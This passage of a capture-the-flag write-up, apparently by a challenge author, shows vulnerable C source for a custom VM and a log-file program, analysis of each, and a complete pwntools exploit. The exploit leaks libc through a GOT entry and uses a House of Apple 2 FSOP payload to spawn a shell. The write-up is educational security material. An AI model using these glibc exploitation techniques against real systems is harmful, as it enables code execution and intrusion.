+	OP_ENTER,
+	OP_LEAVE,
+	OP_POP,
+	OP_PUSH,
+} Opcode;
+
+<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> {</span>
+	Opcode op;
+	<span class="hljs-type">int</span> a;
+	<span class="hljs-type">int</span> b;
+} Instruction;
+
+<span class="hljs-class"><span class="hljs-keyword">struct</span> {</span>
+	<span class="hljs-type">long</span> regs[NUM_REGS];
+	Instruction program[MAX_PROG];
+	<span class="hljs-type">long</span> pc;
+} CPU; <span class="hljs-comment">// god im terrible at ts</span>
+
+<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> {</span>
+	<span class="hljs-type">long</span> regs[NUM_REGS];
+	Instruction program[MAX_PROG];
+	<span class="hljs-type">long</span> pc;
+
+	<span class="hljs-type">long</span> *memory;
+
+	<span class="hljs-type">long</span> <span class="hljs-built_in">stack</span>[STACK_SIZE];
+} VM;
+
+<span class="hljs-type">static</span> <span class="hljs-type">bool</span> <span class="hljs-title function_">overlaps</span><span class="hljs-params">(<span class="hljs-type">void</span> *p1, <span class="hljs-type">size_t</span> s1, <span class="hljs-type">void</span> *p2, <span class="hljs-type">size_t</span> s2)</span> {
+    <span class="hljs-type">char</span> *a1 = p1, *a2 = p2;
+    <span class="hljs-keyword">return</span> (a1 &lt; a2 + s2) &amp;&amp; (a2 &lt; a1 + s1);
+}
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">handle_read</span><span class="hljs-params">(VM *vm, <span class="hljs-type">int</span> fd, <span class="hljs-type">char</span>* buf, <span class="hljs-type">size_t</span> size)</span> {
+    <span class="hljs-keyword">if</span> (overlaps(buf, size, vm, <span class="hljs-keyword">sizeof</span>(CPU))) {
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error: writing into protected VM memory\n&quot;</span>);
+        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
+    }
+
+    <span class="hljs-keyword">return</span> read(fd, buf, size);
+}
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">handle_write</span><span class="hljs-params">(VM *vm, <span class="hljs-type">int</span> fd, <span class="hljs-type">char</span>* buf, <span class="hljs-type">size_t</span> size)</span> {
+    <span class="hljs-keyword">if</span> (overlaps(buf, size, vm, <span class="hljs-keyword">sizeof</span>(CPU))) {
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error: writing into protected VM memory\n&quot;</span>);
+        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
+    }
+
+    <span class="hljs-keyword">return</span> write(fd, buf, size);
+}
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">handle_syscall</span><span class="hljs-params">(VM *vm, Instruction instr)</span> {
+	<span class="hljs-keyword">switch</span> (REG(R7)) {
+		<span class="hljs-keyword">case</span> SYS_READ: 
+			REG(R7) = handle_read(vm, REG(R0), (<span class="hljs-type">char</span>*)REG(R1), (<span class="hljs-type">size_t</span>)REG(R2));
+			<span class="hljs-keyword">break</span>;
+		<span class="hljs-keyword">case</span> SYS_WRITE:
+			REG(R7) = handle_write(vm, REG(R0), (<span class="hljs-type">char</span>*)REG(R1), (<span class="hljs-type">size_t</span>)REG(R2));
+			<span class="hljs-keyword">break</span>;
+		<span class="hljs-keyword">default</span>: 
+			<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Unknown syscall %d\n&quot;</span>, REG(R7));
+			<span class="hljs-keyword">return</span>;
+	}
+}
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">handle_call</span><span class="hljs-params">(VM *vm, Instruction instr)</span> {
+	<span class="hljs-keyword">if</span> (REG(SP) + <span class="hljs-number">1</span> &gt;= STACK_SIZE) {
+		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error: stack overflow\n&quot;</span>);
+		<span class="hljs-keyword">return</span>;
+	}
+	vm-&gt;<span class="hljs-built_in">stack</span>[REG(SP)++] = vm-&gt;pc;
+	vm-&gt;pc = instr.a;
+}
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">handle_ret</span><span class="hljs-params">(VM *vm)</span> {
+	<span class="hljs-keyword">if</span> (REG(SP) &lt;= <span class="hljs-number">0</span>) {
+		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error: stack underflow\n&quot;</span>);
+		<span class="hljs-keyword">return</span>;
+	}
+	vm-&gt;pc = vm-&gt;<span class="hljs-built_in">stack</span>[--REG(SP)];
+}
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">handle_leave</span><span class="hljs-params">(VM *vm)</span> {
+	REG(SP) = REG(BP);
+	REG(BP) = vm-&gt;<span class="hljs-built_in">stack</span>[--REG(SP)];
+}
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">handle_enter</span><span class="hljs-params">(VM *vm)</span> {
+	<span class="hljs-keyword">if</span> (REG(SP) + <span class="hljs-number">2</span> &gt;= STACK_SIZE) {
+		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error: stack overflow\n&quot;</span>);
+		<span class="hljs-keyword">return</span>;
+	}
+	vm-&gt;<span class="hljs-built_in">stack</span>[REG(SP)++] = REG(BP);
+	REG(BP) = REG(SP);
+}
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">(VM *vm)</span> {
+	<span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {
+		Instruction instr = vm-&gt;program[vm-&gt;pc++];
+		<span class="hljs-type">int</span> addr = <span class="hljs-number">0</span>;
+
+		<span class="hljs-keyword">switch</span> (instr.op) {
+			<span class="hljs-keyword">case</span> OP_HALT: <span class="hljs-keyword">return</span>;
+			<span class="hljs-keyword">case</span> OP_MOV: vm-&gt;regs[instr.a] = vm-&gt;regs[instr.b]; <span class="hljs-keyword">break</span>;
+			<span class="hljs-keyword">case</span> OP_LOADI: vm-&gt;regs[instr.a] = instr.b; <span class="hljs-keyword">break</span>;
+			<span class="hljs-keyword">case</span> OP_ADD: vm-&gt;regs[instr.a] = vm-&gt;regs[instr.a] + instr.b; <span class="hljs-keyword">break</span>;
+			<span class="hljs-keyword">case</span> OP_SUB: vm-&gt;regs[instr.a] = vm-&gt;regs[instr.a] - instr.b; <span class="hljs-keyword">break</span>;
+			<span class="hljs-keyword">case</span> OP_MUL: vm-&gt;regs[instr.a] = vm-&gt;regs[instr.a] * instr.b; <span class="hljs-keyword">break</span>;
+			<span class="hljs-keyword">case</span> OP_DIV: vm-&gt;regs[instr.a] = vm-&gt;regs[instr.a] / instr.b; <span class="hljs-keyword">break</span>;
+			<span class="hljs-keyword">case</span> OP_PRINT: <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;R%d = 0x%x\n&quot;</span>, instr.a, vm-&gt;regs[instr.a]); <span class="hljs-keyword">break</span>;
+			<span class="hljs-keyword">case</span> OP_JMP: vm-&gt;pc = instr.a; <span class="hljs-keyword">break</span>;
+			<span class="hljs-keyword">case</span> OP_CALL: 
+				handle_call(vm, instr);
+				<span class="hljs-keyword">break</span>;
+			<span class="hljs-keyword">case</span> OP_RET:
+				handle_ret(vm);
+				<span class="hljs-keyword">break</span>;
+			<span class="hljs-keyword">case</span> OP_LOAD:
+				addr = vm-&gt;regs[instr.b];
+				<span class="hljs-keyword">if</span> (addr &lt; <span class="hljs-number">0</span> || addr &gt;= MEM_SIZE) {
+					<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error: invalid memory read at %d\n&quot;</span>, addr);
+					<span class="hljs-keyword">return</span>;
+				}
+				REG(instr.a) = vm-&gt;memory[addr];
+				<span class="hljs-keyword">break</span>;
+			<span class="hljs-keyword">case</span> OP_STORE:
+				addr = REG(instr.a);
+				<span class="hljs-keyword">if</span> (addr &lt; <span class="hljs-number">0</span> || addr &gt;= MEM_SIZE) {
+					<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error: invalid memory read at %d\n&quot;</span>, addr);
+					<span class="hljs-keyword">return</span>;
+				}
+				vm-&gt;memory[addr] = REG(instr.b);
+				<span class="hljs-keyword">break</span>;
+			<span class="hljs-keyword">case</span> OP_SYSCALL:
+				handle_syscall(vm, instr);
+				<span class="hljs-keyword">break</span>;
+			<span class="hljs-keyword">case</span> OP_ENTER:
+				handle_enter(vm);
+				<span class="hljs-keyword">break</span>;
+			<span class="hljs-keyword">case</span> OP_LEAVE:
+				handle_leave(vm);
+				<span class="hljs-keyword">break</span>;
+			<span class="hljs-keyword">case</span> OP_PUSH:
+				vm-&gt;<span class="hljs-built_in">stack</span>[REG(SP)++] = REG(instr.a);
+				<span class="hljs-keyword">break</span>;
+			<span class="hljs-keyword">case</span> OP_POP:
+				REG(instr.a) = vm-&gt;<span class="hljs-built_in">stack</span>[--REG(SP)];
+				<span class="hljs-keyword">break</span>;
+			<span class="hljs-keyword">default</span>:
+				<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Unknown opcode %d\n&quot;</span>, instr.op);
+				<span class="hljs-keyword">return</span>;
+		}
+	}
+}
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
+
+	setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>, _IONBF, <span class="hljs-number">0</span>);
+	setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>, _IONBF, <span class="hljs-number">0</span>);
+
+	VM *vm = mmap((<span class="hljs-type">void</span>*)<span class="hljs-number">0x10000</span>, <span class="hljs-number">0x100000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);
+	<span class="hljs-built_in">memset</span>(vm, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(*vm));
+	<span class="hljs-built_in">memset</span>(vm-&gt;program, <span class="hljs-number">0xff</span>, <span class="hljs-keyword">sizeof</span>(vm-&gt;program));
+
+	<span class="hljs-keyword">if</span> (vm == MAP_FAILED) {
+		perror(<span class="hljs-string">&quot;mmap&quot;</span>);
+		<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+	}
+
+	vm-&gt;memory = <span class="hljs-built_in">malloc</span>(MEM_SIZE);
+	<span class="hljs-keyword">if</span> (vm-&gt;memory == <span class="hljs-literal">NULL</span>) {
+		perror(<span class="hljs-string">&quot;malloc&quot;</span>);
+		<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+	}
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;stack: %p\n&quot;</span>, &amp;vm-&gt;<span class="hljs-built_in">stack</span>);
+
+	Instruction prog[] = {
+		{OP_ENTER},
+		{OP_PRINT, SP, <span class="hljs-number">0</span>},
+		{OP_CALL, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>},
+		{OP_PRINT, SP, <span class="hljs-number">0</span>},
+		{OP_PRINT, BP, <span class="hljs-number">0</span>},
+		{OP_HALT},
+		{<span class="hljs-number">0xFF</span>},
+		{OP_ENTER},
+		{OP_ADD, SP, <span class="hljs-number">16</span>},
+		{OP_MOV, R6, SP},
+		{OP_ADD, R6, (<span class="hljs-type">int</span>)((<span class="hljs-type">char</span>*)&amp;vm-&gt;<span class="hljs-built_in">stack</span> - <span class="hljs-number">0x10</span>)},
+		{OP_MOV, R1, R6},
+		{OP_LOADI, R0, <span class="hljs-number">0</span>},
+		{OP_LOADI, R2, <span class="hljs-number">0x1000</span>},
+		{OP_LOADI, R7, SYS_READ},
+		{OP_PRINT, R0, <span class="hljs-number">0</span>},
+		{OP_PRINT, R1, <span class="hljs-number">0</span>},
+		{OP_PRINT, R2, <span class="hljs-number">0</span>},
+		{OP_PRINT, SP, <span class="hljs-number">0</span>},
+		{OP_PRINT, BP, <span class="hljs-number">0</span>},
+		{OP_SYSCALL, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>},
+		{OP_LEAVE},
+		{OP_RET}
+	};
+
+	<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sizeof</span>(prog)/<span class="hljs-keyword">sizeof</span>(Instruction); i++) {
+		vm-&gt;program[i] = prog[i];
+	}
+
+	run(vm);
+	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</code></pre>
+<p>The challenge implements a register virtual machine that runs a program. The virtual machine differentiates between a LOADI operation for moving constant values into registers and a MOV instruction that moves values from one register to another.</p>
+<p>The program provides a buffer overflow into the “return address” of the program, which is an index relative to the .text (code) section of the virtual machine.</p>
+<h3 id="how-does-the-vm-work%3F"tabindex="-1">How does the VM work?</h3>
+<h4 id="instructions"tabindex="-1">Instructions</h4>
+<p>Instructions consist of:</p>
+<pre class="hljs"><code><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> {</span>
+	Opcode op;
+	<span class="hljs-type">int</span> a;
+	<span class="hljs-type">int</span> b;
+} Instruction;
+</code></pre>
+<p>Hence, values moved into registers with instructions can only be 32-bit, despite the registers being 64-bit.</p>
+<h4 id="stack"tabindex="-1">Stack</h4>
+<p>Programs begin with an <code>ENTER</code> and end with <code>LEAVE; RET</code>, much like x86_64 programs:</p>
+<ul>
+<li><code>ENTER</code>: pushes BP onto the stack, and then moves SP, the stack pointer, into BP</li>
+<li><code>LEAVE</code>: moves BP into SP, and then pops BP from SP</li>
+</ul>
+<p>When a <code>CALL</code> instruction is executed, the VM:</p>
+<ul>
+<li>pushes the address of the instruction of the call</li>
+<li>sets the program counter (PC) to the address of the callee</li>
+</ul>
+<p>As a result of this, the stack layout looks somewhat like:</p>
+<pre class="hljs"><code>[BUFFER]
+[RETURN ADDRESS]
+[SAVED BP]
+</code></pre>
+<h4 id="syscalls"tabindex="-1">Syscalls</h4>
+<p>The VM provides an interface for syscalls:</p>
+<pre class="hljs"><code><span class="hljs-type">void</span> <span class="hljs-title function_">handle_syscall</span><span class="hljs-params">(VM *vm, Instruction instr)</span> {
+	<span class="hljs-keyword">switch</span> (REG(R7)) {
+		<span class="hljs-keyword">case</span> SYS_READ: 
+			REG(R7) = handle_read(vm, REG(R0), (<span class="hljs-type">char</span>*)REG(R1), (<span class="hljs-type">size_t</span>)REG(R2));
+			<span class="hljs-keyword">break</span>;
+		<span class="hljs-keyword">case</span> SYS_WRITE:
+			REG(R7) = handle_write(vm, REG(R0), (<span class="hljs-type">char</span>*)REG(R1), (<span class="hljs-type">size_t</span>)REG(R2));
+			<span class="hljs-keyword">break</span>;
+		<span class="hljs-keyword">default</span>: 
+			<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Unknown syscall %d\n&quot;</span>, REG(R7));
+			<span class="hljs-keyword">return</span>;
+	}
+}
+</code></pre>
+<p>However, only read and write syscalls can be performed.</p>
+<h2 id="challenge-analysis-1"tabindex="-1">Challenge Analysis</h2>
+<h3 id="vulnerability"tabindex="-1">Vulnerability</h3>
+<p>Aside from the buffer overflow, notably, there is no distinction between a memory region for the code and a memory region for data, such as the stack.</p>
+<p>Even further, there are no read-write-execute protections on each memory region unlike that of a normal binary in virtual address space.</p>
+<p>This gives us the ability to write arbitrary “shellcode” and return to it in the VM regardless of the location.</p>
+<h3 id="solve-process"tabindex="-1">Solve Process</h3>
+<p>From GDB, it can be seen that our buffer is 5 bytes from the return address:</p>
+<pre class="hljs"><code>$rsi  0x00000001c063|+0x0000|+000: 0x0000030000000000 &lt;-- buffer
+      0x00000001c06b|+0x0008|+001: 0x0000010000000000
+</code></pre>
+<p>Since we can only perform read or write syscalls, we will have to gain arbitrary read and arbitrary write to eventually perform a www2exec attack (write-what-where to execute).</p>
+<p>We will first have to leak the libc base. To do this, we overwrite the return address to return to shellcode that we place on the stack to write out the contents of a GOT entry:</p>
+<pre class="hljs"><code>p = process()
+<span class="hljs-comment"># gdb.attach(p)</span>
+
+instrs = assemble_lines(<span class="hljs-string">f&#x27;&#x27;&#x27;
+LOADI R0, 1
+LOADI R1, <span class="hljs-subst">{elf.got.printf}</span>
+LOADI R2, 8
+LOADI R7, 1
+SYSCALL
+CALL 7
+LOADI R0, 0
+MOV R1, BP
+LOADI R2, <span class="hljs-subst">{<span class="hljs-number">0x100</span>}</span>
+LOADI R7, 0
+SYSCALL
+&#x27;&#x27;&#x27;</span>.splitlines())
+
+shellcode = write_binary(instrs)
+
+p.send(flat(
+    <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">5</span>,
+    p64(<span class="hljs-number">0x1003</span>), <span class="hljs-comment"># ret</span>
+    p32(<span class="hljs-number">0</span>),      <span class="hljs-comment"># bp</span>
+    shellcode
+))
+
+p.recvuntil(<span class="hljs-string">b&#x27;R9 = &#x27;</span>)
+p.recvline()
+libc.address = u64(p.recv(<span class="hljs-number">8</span>)) - libc.sym.printf
+log.info(<span class="hljs-string">&quot;libc.address, %#x&quot;</span>, libc.address)
+</code></pre>
+<p>We first set up a write syscall that writes out the contents of the <code>printf</code> GOT entry to stdout. Afterwards, we call back into the main program so that we may yet again have a buffer overflow to setup the arbitrary write to pop a shell.</p>
+<p>There are additional instructions after the call that move BP into R1 before calling the read syscall. Why is this so?</p>
+<h3 id="fsop"tabindex="-1">FSOP</h3>
+<p>With the convenience of our arbitrary write, given we only have libc base, File Stream Oriented Programming (FSOP) will be an appropriate attack, where we will write to the stderr file struct. We will use the <a href="https://roderickchan.github.io/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-1/">House of Apple 2</a> FSOP attack to gain our shell.</p>
+<p>However, our instructions only allow 32-bit values to be loaded into registers. How can we load a libc address into our registers to set up the syscall, given that libc addresses are 6 bytes long?</p>
+<p>What we could do is instead leverage the <code>LEAVE; RET</code> instructions that are executed at the end of the main program after our buffer read.</p>
+<p>By overwriting the saved BP value on the stack with the address of the stderr file struct, notice that <code>LEAVE; RET</code> pops the saved BP value into the BP register.</p>
+<p>Hence, we can write further shellcode to move the value in the BP register to the argument register to set up our read syscall.</p>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">from</span> assembler <span class="hljs-keyword">import</span> write_binary, assemble_lines
+
+elf = context.binary = ELF(<span class="hljs-string">&quot;./main&quot;</span>, checksec=<span class="hljs-literal">False</span>)
+libc = ELF(<span class="hljs-string">&quot;/usr/lib64/libc.so.6&quot;</span>, checksec=<span class="hljs-literal">False</span>)
+context.log_level = <span class="hljs-string">&#x27;error&#x27;</span>
+context.terminal = <span class="hljs-string">&#x27;kitty&#x27;</span>
+
+p = process()
+<span class="hljs-comment"># gdb.attach(p)</span>
+
+instrs = assemble_lines(<span class="hljs-string">f&#x27;&#x27;&#x27;
+LOADI R0, 1
+LOADI R1, <span class="hljs-subst">{elf.got.printf}</span>
+LOADI R2, 8
+LOADI R7, 1
+SYSCALL
+CALL 7
+LOADI R0, 0
+MOV R1, BP
+LOADI R2, <span class="hljs-subst">{<span class="hljs-number">0x100</span>}</span>
+LOADI R7, 0
+SYSCALL
+&#x27;&#x27;&#x27;</span>.splitlines())
+
+shellcode = write_binary(instrs)
+
+p.send(flat(
+    <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">5</span>,
+    p64(<span class="hljs-number">0x1003</span>), <span class="hljs-comment"># ret</span>
+    p32(<span class="hljs-number">0</span>),      <span class="hljs-comment"># bp</span>
+    shellcode
+))
+
+p.recvuntil(<span class="hljs-string">b&#x27;R9 = &#x27;</span>)
+p.recvline()
+libc.address = u64(p.recv(<span class="hljs-number">8</span>)) - libc.sym.printf
+log.info(<span class="hljs-string">&quot;libc.address, %#x&quot;</span>, libc.address)
+
+p.send(flat(
+    <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">5</span>,
+    p64(<span class="hljs-number">0x1009</span>),
+    p64(libc.sym._IO_2_1_stderr_),
+))
+
+stderr_addr = libc.sym._IO_2_1_stderr_
+
+fs = FileStructure()
+fs.flags = u64(<span class="hljs-string">&quot;  &quot;</span> + <span class="hljs-string">&quot;sh&quot;</span>.ljust(<span class="hljs-number">6</span>, <span class="hljs-string">&quot;\x00&quot;</span>))
+fs._IO_write_base = <span class="hljs-number">0</span>
+fs._IO_write_ptr = <span class="hljs-number">1</span>
+fs._lock = stderr_addr-<span class="hljs-number">0x10</span> <span class="hljs-comment"># Should be null</span>
+fs.chain = libc.sym.system
+fs._codecvt = stderr_addr
+<span class="hljs-comment"># stderr becomes it&#x27;s own wide data vtable</span>
+<span class="hljs-comment"># Offset is so that system (fs.chain) is called</span>
+fs._wide_data = stderr_addr - <span class="hljs-number">0x48</span>
+fs.vtable = libc.sym._IO_wfile_jumps
+
+p.send(<span class="hljs-built_in">bytes</span>(fs))
+
+p.interactive()
+</code></pre>
+<h1 id="pwn%2Fbad-apple-2"tabindex="-1">pwn/bad apple 2</h1>
+<h2 id="challenge-protections-3"tabindex="-1">Challenge Protections</h2>
+<pre class="hljs"><code>[*] '/home/nikolawinata/Documents/ctf/ybn25/fflush/solution/chal'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+</code></pre>
+<h2 id="challenge-3"tabindex="-1">Challenge</h2>
+<pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>
+
+<span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span>
+{</span>
+  FILE file;
+  <span class="hljs-type">void</span> *vtable;
+};
+
+<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Log</span> {</span>
+    <span class="hljs-type">char</span> name[<span class="hljs-number">0x100</span>];
+    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span> <span class="hljs-title">fp</span>;</span>
+    <span class="hljs-type">int</span> open;
+};
+
+<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Log</span> *<span class="hljs-title">global_log</span>;</span>
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">menu</span><span class="hljs-params">()</span> {
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1. Create log&quot;</span>);
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2. Write entry&quot;</span>);
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3. Change name&quot;</span>);
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;4. Show log&quot;</span>);
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;5. Free log&quot;</span>);
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;6. Exit&quot;</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt; &quot;</span>);
+}
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">create_log</span><span class="hljs-params">()</span> {
+    global_log = <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> Log));
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Log: %p\n&quot;</span>, global_log);
+    <span class="hljs-built_in">memset</span>(global_log, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> Log));
+    FILE *tmp = tmpfile();
+    <span class="hljs-built_in">memcpy</span>(&amp;global_log-&gt;fp, tmp, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> _IO_FILE_plus));
+    <span class="hljs-built_in">strcpy</span>(global_log-&gt;name, <span class="hljs-string">&quot;journal&quot;</span>);
+    global_log-&gt;open = <span class="hljs-number">1</span>;
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Log created.&quot;</span>);
+}
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">show_entry</span><span class="hljs-params">()</span> {
+    <span class="hljs-keyword">if</span> (!global_log) {
+        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;No log.&quot;</span>);
+        <span class="hljs-keyword">return</span>;
+    }
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Entry: &quot;</span>);
+    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x100</span>];
+    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));
+    fgets(buf, <span class="hljs-number">0x100</span>, &amp;global_log-&gt;fp.file);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, buf);
+    <span class="hljs-keyword">return</span>;
+}
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">write_entry</span><span class="hljs-params">()</span> {
+    <span class="hljs-keyword">if</span> (!global_log || !global_log-&gt;open) {
+        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;No log.&quot;</span>);
+        <span class="hljs-keyword">return</span>;
+    }
+    <span class="hljs-type">char</span> buf[<span class="hljs-number">128</span>];
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Entry: &quot;</span>);
+    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">128</span>);
+}
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">free_log</span><span class="hljs-params">()</span> {
+    <span class="hljs-keyword">if</span> (!global_log) {
+        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;No log.&quot;</span>);
+        <span class="hljs-keyword">return</span>;
+    }
+    fflush(&amp;global_log-&gt;fp.file);
+    global_log = <span class="hljs-literal">NULL</span>;
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Log freed.&quot;</span>);
+}
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">change_name</span><span class="hljs-params">()</span> {
+    <span class="hljs-keyword">if</span> (!global_log) {
+        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;No log.&quot;</span>);
+        <span class="hljs-keyword">return</span>;
+    }
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Name: &quot;</span>);
+    read(<span class="hljs-number">0</span>, global_log-&gt;name, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> Log));
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Name changed.&quot;</span>);
+    <span class="hljs-keyword">return</span>;
+}
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
+    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);
+    setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);
+    setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-literal">NULL</span>);
+    <span class="hljs-type">int</span> choice;
+    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {
+        menu();
+        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%*c&quot;</span>, &amp;choice) != <span class="hljs-number">1</span>) <span class="hljs-keyword">break</span>;
+        <span class="hljs-keyword">switch</span> (choice) {
+            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>: create_log(); <span class="hljs-keyword">break</span>;
+            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>: write_entry(); <span class="hljs-keyword">break</span>;
+            <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>: change_name(); <span class="hljs-keyword">break</span>;
+            <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>: show_entry(); <span class="hljs-keyword">break</span>;
+            <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>: free_log(); <span class="hljs-keyword">break</span>;
+            <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>: <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
+            <span class="hljs-keyword">default</span>: <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid.&quot;</span>); <span class="hljs-keyword">break</span>;
+        }
+    }
+}
+</code></pre>
+<p>The program allows the creation of “logs”, which contain a name field as well as a file struct.</p>
+<p>When a log is created, a temporary file is opened with <code>fopen()</code>, which allocates a file struct onto the heap in the Log structure.</p>
+<p>There is an obvious buffer overflow in the name field <code>change_name()</code> which overflows in the file struct.</p>
+<h2 id="house-of-apple%E2%80%A6-to-where%3F"tabindex="-1">House of Apple… to where?</h2>
+<p>(Being careless I unintentionally left an unintended solve path which allowed players to obtain LIBC leaks by modifying the file structure to write the contents of an arbitrary address to the file, and then read from the file.)</p>
+<p>Given that we have no knowledge of libc base, it is not as straightforward for us to call <code>system(&quot;/bin/sh&quot;)</code>, or perform a conventional House of Apple.</p>
+<p>However, realising that we know where the file struct is located in the heap, it is sufficient for us to perform a House of Apple by partial overwriting the <code>vtable</code> field of the file struct. This gives us an arbitrary call primitive!</p>
+<p>The question is, call what?</p>
+<p>The program provides a suspicious <code>write_entry()</code> function:</p>
+<pre class="hljs"><code><span class="hljs-type">void</span> <span class="hljs-title function_">write_entry</span><span class="hljs-params">()</span> {
+    <span class="hljs-keyword">if</span> (!global_log || !global_log-&gt;open) {
+        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;No log.&quot;</span>);
+        <span class="hljs-keyword">return</span>;
+    }
